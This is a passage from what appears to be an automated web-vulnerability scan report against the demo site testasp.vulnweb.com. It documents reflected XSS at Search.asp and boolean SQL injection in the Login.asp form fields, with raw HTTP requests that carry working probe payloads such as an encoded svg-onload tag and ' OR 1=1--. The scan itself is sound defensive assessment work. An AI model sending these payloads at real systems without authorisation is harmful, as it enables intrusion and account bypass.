      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[IMPACT] — verified**

  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.

  - `finding` ref `F-392b76b39c` excerpt: `impact grade=proven; chain: oracle:replay-2round on GET http://testasp.vulnweb.com/showforum.asp`
    finding: sql_injection GET http://testasp.vulnweb.com/showforum.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

</details>


### AP-6721bbeb87 — VERIFIED — xss_reflected at /Search.asp — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-9e99b000d0 | chain_rule: — | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material  |
| **entry** | verified | GET http://testasp.vulnweb.com/Search.asp — parameter tfSearch |
| **action** | verified | attacker-supplied markup/JavaScript injected through the parameter survives into the response in an executable context |
| **object** | verified | the HTTP response rendered to the victim |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without furth |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-0f330f7a` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E&tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:23 GMT
      content-length: 3432
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `journal` ref `req-1a16cfe2` excerpt: `ASPSESSIONID=[REDACTED]; path=/`
    REQUEST  GET http://testasp.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      set-cookie: ASPSESSIONID=[REDACTED]; path=/
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:30:52 GMT
      content-length: 3542
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-9e99b000d0` excerpt: `canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</`
    finding: xss_reflected GET http://testasp.vulnweb.com/Search.asp param=tfSearch status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><tabl
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>, <sentinelx
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[ENTRY] — verified**

  GET http://testasp.vulnweb.com/Search.asp — parameter tfSearch

  - `finding` ref `F-9e99b000d0` excerpt: `canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</`
    finding: xss_reflected GET http://testasp.vulnweb.com/Search.asp param=tfSearch status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><tabl
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>, <sentinelx
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-052f10fc` excerpt: `http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E&tfSearch=%3Csvg%0Aonload%3Dsentinel`
    REQUEST  GET http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E&tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:26 GMT
      content-length: 3432
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[ACTION] — verified**

  attacker-supplied markup/JavaScript injected through the parameter survives into the response in an executable context

  - `finding` ref `F-9e99b000d0` excerpt: `verification: re-test:variant-battery-6 (passed=True)`
    finding: xss_reflected GET http://testasp.vulnweb.com/Search.asp param=tfSearch status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><tabl
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>, <sentinelx
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-052f10fc` excerpt: `http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E&tfSearch=%3Csvg%0Aonload%3Dsentinel`
    REQUEST  GET http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E&tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:26 GMT
      content-length: 3432
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[OBJECT] — verified**

  the HTTP response rendered to the victim

  - `finding` ref `F-9e99b000d0` excerpt: `canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</`
    finding: xss_reflected GET http://testasp.vulnweb.com/Search.asp param=tfSearch status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><tabl
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>, <sentinelx
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-052f10fc` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E&tfSearch=%3Csvg%0Aonload%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:26 GMT
      content-length: 3432
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-9e99b000d0` excerpt: `canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</`
    finding: xss_reflected GET http://testasp.vulnweb.com/Search.asp param=tfSearch status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><tabl
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>, <sentinelx
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-9e99b000d0` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: xss_reflected GET http://testasp.vulnweb.com/Search.asp param=tfSearch status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><tabl
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>, <sentinelx
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[IMPACT] — verified**

  Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.

  - `finding` ref `F-9e99b000d0` excerpt: `impact grade=proven; chain: re-test:variant-battery-6 on GET http://testasp.vulnweb.com/Search.asp`
    finding: xss_reflected GET http://testasp.vulnweb.com/Search.asp param=tfSearch status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><tabl
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [
      evidence[unescaped_reflection]: canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>, <sentinelx
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

</details>


### AP-965fc06fe7 — VERIFIED — sql_injection at /Login.asp — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-1b63b983d5 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material  |
| **entry** | verified | POST http://testasp.vulnweb.com/Login.asp — parameter tfUPass |
| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
| **object** | verified | the SQL query evaluation (a read-capable oracle) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: tfUName, tfUPass) |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-3899cc02` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=sentinel&tfUPass=1%27+OR+1%3D1--
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:37:05 GMT
      content-length: 3473
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `journal` ref `req-1a16cfe2` excerpt: `ASPSESSIONID=[REDACTED]; path=/`
    REQUEST  GET http://testasp.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      set-cookie: ASPSESSIONID=[REDACTED]; path=/
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:30:52 GMT
      content-length: 3542
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-1b63b983d5` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUPass status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[ENTRY] — verified**

  POST http://testasp.vulnweb.com/Login.asp — parameter tfUPass

  - `finding` ref `F-1b63b983d5` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUPass status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-048eb214` excerpt: `http://testasp.vulnweb.com/Login.asp`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=1+AND+1%3D1&tfUPass=sentinel
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:56 GMT
      content-length: 3474
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[ACTION] — verified**

  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes

  - `finding` ref `F-1b63b983d5` excerpt: `verification: oracle:or-bodydiff-2round (passed=True)`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUPass status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-048eb214` excerpt: `tfUPass=sentinel`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=1+AND+1%3D1&tfUPass=sentinel
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:56 GMT
      content-length: 3474
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[OBJECT] — verified**

  the SQL query evaluation (a read-capable oracle)

  - `finding` ref `F-1b63b983d5` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUPass status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: tfUName, tfUPass)

  - `journal` ref `req-048eb214` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=1+AND+1%3D1&tfUPass=sentinel
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:56 GMT
      content-length: 3474
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-1b63b983d5` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUPass status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-1b63b983d5` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUPass status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[IMPACT] — verified**

  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.

  - `finding` ref `F-1b63b983d5` excerpt: `impact grade=proven; chain: oracle:or-bodydiff-2round on POST http://testasp.vulnweb.com/Login.asp`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUPass status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4670B vs FALSE 3158B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

</details>


### AP-c74a02056e — VERIFIED — sql_injection at /Login.asp — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-513d590d27 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material  |
| **entry** | verified | POST http://testasp.vulnweb.com/Login.asp — parameter tfUName |
| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
| **object** | verified | the SQL query evaluation (a read-capable oracle) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: tfUName, tfUPass) |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-3899cc02` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=sentinel&tfUPass=1%27+OR+1%3D1--
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:37:05 GMT
      content-length: 3473
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `journal` ref `req-1a16cfe2` excerpt: `ASPSESSIONID=[REDACTED]; path=/`
    REQUEST  GET http://testasp.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      set-cookie: ASPSESSIONID=[REDACTED]; path=/
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:30:52 GMT
      content-length: 3542
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-513d590d27` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUName status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4679B vs FALSE 3167B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4673B vs FALSE 3161B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2

**[ENTRY] — verified**

  POST http://testasp.vulnweb.com/Login.asp — parameter tfUName

  - `finding` ref `F-513d590d27` excerpt: `quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUName status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4679B vs FALSE 3167B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4673B vs FALSE 3161B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-048eb214` excerpt: `http://testasp.vulnweb.com/Login.asp`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=1+AND+1%3D1&tfUPass=sentinel
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:56 GMT
      content-length: 3474
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[ACTION] — verified**

  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes

  - `finding` ref `F-513d590d27` excerpt: `verification: oracle:or-bodydiff-2round (passed=True)`
    finding: sql_injection POST http://testasp.vulnweb.com/Login.asp param=tfUName status=verified conf=0.95
      evidence[status_oracle]: quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
      evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 4679B vs FALSE 3167B (string-context boolean oracle)
      evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 4673B vs FALSE 3161B (numeric-shape boolean oracle)
      verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-048eb214` excerpt: `tfUName=1+AND+1%3D1&tfUPass=sentinel`
    REQUEST  POST http://testasp.vulnweb.com/Login.asp
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASPSESSIONID=[REDACTED]
      body: tfUName=1+AND+1%3D1&tfUPass=sentinel
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:56 GMT
      content-length: 3474
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[OBJECT] — verified**

